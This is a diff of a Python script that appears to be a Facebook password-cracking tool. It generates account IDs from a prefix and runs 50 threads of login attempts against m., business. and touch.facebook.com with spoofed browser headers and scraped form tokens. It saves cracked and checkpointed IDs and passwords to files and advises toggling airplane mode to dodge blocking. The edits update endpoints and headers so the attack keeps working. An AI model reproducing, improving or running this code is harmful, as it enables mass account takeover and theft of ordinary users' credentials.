@@ -26,7 +26,7 @@ import requests,certifi
 from requests.exceptions import ConnectionError
 from requests import api
 from requests import models
-from requests import Sessions  
+from requests import Session 
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
 import os,sys,time,json,random,re,string,platform,base64,platform,uuid
@@ -1122,21 +1122,20 @@ def SUMON2():
     linex()
     SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
-    print(" [+] COOKIES SHOW : (Y/N) ")
+    print(" [?] Do You Want To Show Cookies : (Y/N) ")
     linex()
     c = input(" [?] INPUT : ")
     if c in ["Y", "y"]:
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as SUMON_xd:
+    with ThreadPool(max_workers=50) as SUMON_xd:
         clear()
         SUMON_time()
         tl = str(len(user))
         print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
         print(f"[+] YOUR CODE CHOOSED : "+kode)
-        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
-        linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
+        linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE ON/OFF ');linex()
         for guru in user:
             uid = kode+guru
             mk = uid[:6]
@@ -1752,7 +1751,7 @@ def mbasic(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M1--SUMON) ({loop}) (OK-{len(oks)})\r"),
+    sys.stdout.write(f"\r {green}(M1==SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1816,7 +1815,7 @@ def mbasic(uid,pwx,tl):
                     break
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki1[0:11]
+                uid = "1000"+coki[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
@@ -1914,7 +1913,7 @@ def p(uid,pwx,tl):
                     break
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki1[0:11]
+                uid = "1000"+coki[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
@@ -1942,34 +1941,37 @@ def x(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com').text
+            free_fb = Session.get('https://m.facebook.com/').text
             data = {
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
-            'next': 'https://m.facebook.com/v3.2/dialog/oauth?response_type=code&redirect_uri=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback&scope=email&state=https%3A%2F%2Fpixlr.com%2F&client_id=144117062837799&ret=login&fbapp_pres=0&logger_id=27279048-2ffa-4266-a587-1693d6522204&tp=unspecified',
+            'next': 'https://business.facebook.com/login/save-device/',
             'flow': 'login_no_pin',
             'pass': pw,
             'login': 'Log in'}
             headers = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
+            'authority': 'business.facebook.com',
+            'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://business.facebook.com',
+            'referer': 'https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23128PC33I"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"13"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
+            'user-agent': ua,
+            'x-asbd-id': '129477',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1997,7 +1999,7 @@ def x(uid,pwx,tl):
                     break
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki1[0:11]
+                uid = "1000"+coki[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
@@ -2063,7 +2065,7 @@ def mobile(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -2091,7 +2093,7 @@ def mobile(uid,pwx,tl):
                     break
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki1[0:11]
+                uid = "1000"+coki[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
@@ -2120,8 +2122,8 @@ def freeq(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com').text
-            data ={
+            free_fb = Session.get('https://m.facebook.com/').text
+            data = {
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
@@ -2130,7 +2132,7 @@ def freeq(uid,pwx,tl):
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             'login': 'Masuk'}
             headers = {
-            'Host': 'm.facebook.com',
+            'Host': 'business.facebook.com',
             'method': 'POST',
             'path': '/login/Device-based/login/async/',
             'scheme': 'https',
@@ -2150,8 +2152,8 @@ def freeq(uid,pwx,tl):
             'user-agent': ua,
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'dnt': '1',
-            'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'origin': 'https://business.facebook.com',
+            'referer': 'https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
             'x-requested-with': 'mark.via.gp',
             'sec-fetch-site': 'none',
             'sec-fetch-mode': 'navigate',
@@ -2160,7 +2162,7 @@ def freeq(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -2187,10 +2189,9 @@ def freeq(uid,pwx,tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                cid = coki[141:156]
-                #print('\33[1;91m[DEV-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/Dev-Cp.txt', 'a').write(uid+' | '+pw+'\n')
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -2216,9 +2217,10 @@ def d(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com').text
+            free_fb = Session.get('https://m.facebook.com')
+            soup = BeautifulSoup(free_fb.text, 'html.parser')
             data = {
-            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts": soup.find('input', {'name': 'm_ts'})['value'] if soup.find('input', {'name': 'm_ts'}) else None,
             "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             "try_number": 0,
             "unrecognized_tries": 0,
@@ -2234,27 +2236,37 @@ def d(uid,pwx,tl):
             "bi_xrwh": 0,
             "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-            "jazoest": re.search('name="jazoest" value="(\d+)"', str(free_fb)).group(1),
+            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
+            print(f"{data}")
             headers = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
+            'Host': 'touch.facebook.com',
+            'x-fb-rlafr': '0',
+            'access-control-allow-origin': '*',
+            'facebook-api-version': 'v8.0',
+            'strict-transport-security': 'max-age=15552000; preload',
+            'pragma': 'no-cache',
+            'cache-control': 'max-age=0',
+            'x-fb-debug': 'RW01gY 2TTCMqIdYqyuqmeF1CqLG/4X9gWARBaqViOLMUgCHNzLdLS+51v1LnRgplESoVeUHK j4pMGYJWZrDACA==',
+            'content-length': '0',
+            'sec-ch-ua': 'Not A; Br and"; v="99", "Chromium"; v="98"',
+            'sec-ch-ua-mobile': '0',
+            'sec-ch-ua-platform': '"Android"',
+            'save-data': 'on',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
+            'origin': 'https://touch.facebook.com',
+            'content-type': 'application/x-www-form-urlencoded',
+            'user-agent': 'Mozilla/5 (Linux; Android 13; PJD110; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/87.0.4855.129 Mobile Safari/537.36',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange; v=b3;q=0.9',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-user': '71',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://touch.facebook.com/login.php?skip_api_login=1&api_key=290293790992170&kid_directed_site=0&app_id=290293790992170&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3d0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3d0%26logger_id%3dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&cancel_url=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+            'accept-encoding': 'gzip, deflate',
+            'accept-language': 'id-ID, id;q=0.9, en-GB;q=0.8, en;q=0.7,en-US;q=0.6'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -2282,7 +2294,7 @@ def d(uid,pwx,tl):
                     break
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki1[0:11]
+                uid = "1000"+coki[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
@@ -2574,7 +2586,7 @@ def cracker(uid, pwx, tl):
                     break
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki1[0:11]
+                uid = "1000"+coki[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
